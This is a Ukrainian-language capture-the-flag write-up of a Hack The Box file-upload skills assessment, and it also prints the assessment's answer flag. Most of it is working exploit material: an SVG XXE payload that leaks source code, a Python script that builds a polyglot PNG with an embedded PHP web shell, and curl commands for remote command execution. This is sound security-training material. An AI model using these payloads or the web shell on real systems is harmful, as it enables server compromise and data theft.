## File Uploads — Skills Assessment: Повний ланцюг атаки

**Модуль:** [File Upload Attacks](https://academy.hackthebox.com/app/module/136)
**Секція:** [Skills Assessment](https://academy.hackthebox.com/app/module/136/section/1310)
**Прапор:** `HTB{m4573r1ng_upl04d_3xpl0174710n}`

***

## Концепція

Це фінальне завдання що об'єднує **всі техніки модуля** в один ланцюг:
1. **Розвідка** → ffuf знаходить `/contact/` директорію
2. **SVG XXE** → читаємо вихідний код `upload.php` → дізнаємось директорію і фільтри
3. **Аналіз фільтрів** → blacklist блокує `.ph(p|ps|tml)`, whitelist вимагає 2-3 символьне розширення, MIME перевіряє справжній PNG
4. **Polyglot PNG** → справжній PNG файл з PHP кодом всередині → проходить MIME перевірку
5. **RCE** → відкриваємо shell → читаємо прапор через base64 pipe

***

## Крок 1 — Розвідка: ffuf по директоріях

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://TARGET_IP:PORT"

ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ \
  -u "$TARGET/FUZZ/" -mc 200,301,403 -fs 0 -t 40
# Знайдено: /contact/ [Status: 200]
```

> **Навіщо:** Головна сторінка має лише `index.php`. Upload форма захована в `/contact/`.

***

## Крок 2 — SVG XXE: читаємо вихідний код upload.php

```bash
cat > /tmp/src.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="40">&xxe;</text>
</svg>
EOF

curl -s -X POST "$TARGET/contact/upload.php" \
  -F "uploadFile=@/tmp/src.svg;type=image/svg+xml" \
  | grep -oP '[A-Za-z0-9+/]{40,}={0,2}' | head -1 | base64 -d
```

> **Навіщо:** `/contact/upload.php` приймає SVG без перевірки вмісту. PHP обробляє XXE entities при рендерингу → повертає base64 вихідного коду прямо у відповіді.

**Декодований `upload.php` показує:**
```php
$target_dir = "./user_feedback_submissions/";           // директорія
$fileName = date('ymd') . '_' . basename($_FILES[...]) // префікс YYMMDD_
// Blacklist: блокує .ph(p|ps|tml)  ← .phar НЕ заблокований!
// Whitelist: лише 2-3 символьне розширення (png, jpg, gif...)
// MIME test: перевіряє реальний mime_content_type() → потрібен справжній PNG
```

***

## Крок 3 — Аналіз фільтрів

| Фільтр | Що перевіряє | Bypass |
|---|---|---|
| Blacklist | `.ph(p\|ps\|tml)` regex | `.phar` не в blacklist ✅ |
| Whitelist | розширення 2-3 символи | `.png`, `.jpg` підходять ✅ |
| Content-Type | HTTP заголовок | `type=image/png` в curl ✅ |
| MIME-Type | `mime_content_type()` реальний | Потрібен справжній PNG binary ✅ |

***

## Крок 4 — Створення Polyglot PNG

**Проблема:** `GIF8<?php...?>` проходить Content-Type але `mime_content_type()` читає реальні байти файлу — GIF не є PNG.

**Рішення:** Створити **справжній валідний PNG** з PHP кодом в `tEXt` chunk:

```bash
python3 -c "
import struct, zlib

def png_chunk(chunk_type, data):
    c = chunk_type + data
    return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

sig = b'\x89PNG\r\n\x1a\n'                             # PNG magic bytes
ihdr = png_chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))  # 1x1px header
php  = b'<?php system(\$_GET[\"cmd\"]); ?>'
text = png_chunk(b'tEXt', b'Comment\x00' + php)        # PHP в metadata
idat_data = zlib.compress(b'\x00\xff\xff\xff')
idat = png_chunk(b'IDAT', idat_data)
iend = png_chunk(b'IEND', b'')

with open('/tmp/shell.phar.png', 'wb') as f:
    f.write(sig + ihdr + text + idat + iend)
"

# Верифікація — file повинен показати PNG
file /tmp/shell.phar.png
# /tmp/shell.phar.png: PNG image data, 1 x 1, 8-bit/color RGB, non-interlaced
```

> **Чому `tEXt` chunk:** PNG формат дозволяє довільні metadata chunks. PHP код всередині `tEXt` не впливає на валідність PNG, але виконується коли Apache обробляє файл як PHP через `.phar` розширення.

***

## Крок 5 — Upload і верифікація RCE

```bash
DATESTR=$(date +%y%m%d)
SHELL_URL="$TARGET/contact/user_feedback_submissions/${DATESTR}_shell.phar.png"

# Upload — проходить всі фільтри
curl -s -X POST "$TARGET/contact/upload.php" \
  -F "uploadFile=@/tmp/shell.phar.png;type=image/png"
# Відповідь: <img ... src='data:image/png;base64,...'/> ← сервер відображає PNG

# Верифікація RCE (вивід бінарний — треба base64)
curl -s "$SHELL_URL?cmd=id" | strings | grep uid
# uid=33(www-data)
```

***

## Крок 6 — Пошук і читання прапора

**Проблема:** Вивід команд мішається з бінарними PNG байтами → `grep` не бачить текст.

**Рішення:** Передаємо вивід через `base64` → витягуємо чистий текст:

```bash
DATESTR=$(date +%y%m%d)
SHELL_URL="$TARGET/contact/user_feedback_submissions/${DATESTR}_shell.phar.png"

# Крок 6a: Знаходимо прапор через find + base64
curl -s "$SHELL_URL?cmd=find+/+-maxdepth+1+-type+f+2>/dev/null+|+base64" \
  | strings | grep -oP '[A-Za-z0-9+/]{20,}={0,2}' | tail -1 | base64 -d
# /flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt

# Крок 6b: Читаємо прапор через base64 pipe
curl -s "$SHELL_URL?cmd=cat+/flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt+|+base64" \
  | strings | grep -oP '[A-Za-z0-9+/]{20,}={0,2}' | while read b; do
    decoded=$(echo "$b" | base64 -d 2>/dev/null)
    echo "$decoded" | grep -q 'HTB{' && echo "$decoded"
  done
# HTB{m4573r1ng_upl04d_3xpl0174710n}
```

> **Чому `| base64` у cmd:** PHP виконує `system("cat file | base64")` → вивід іде у PNG як текст → `strings` витягує рядки → `grep` знаходить base64 → декодуємо.

***

## Повний ланцюг атаки

```
[ffuf] → /contact/ знайдено
    ↓
[SVG XXE] → upload.php вихідний код → директорія: user_feedback_submissions/
    ↓                                → blacklist: .ph(p|ps|tml)
    ↓                                → MIME: реальна перевірка
    ↓
[Python polyglot] → справжній PNG + PHP в tEXt chunk + .phar розширення
    ↓
[Upload] → 260625_shell.phar.png → проходить всі 4 фільтри
    ↓
[RCE] → cmd=find / → flag_2b8f1d2da162d8c44b3696a1dd8a91c9.txt
    ↓
[cat | base64] → HTB{m4573r1ng_upl04d_3xpl0174710n}
```

***

## Прапор

```
HTB{m4573r1ng_upl04d_3xpl0174710n}
```
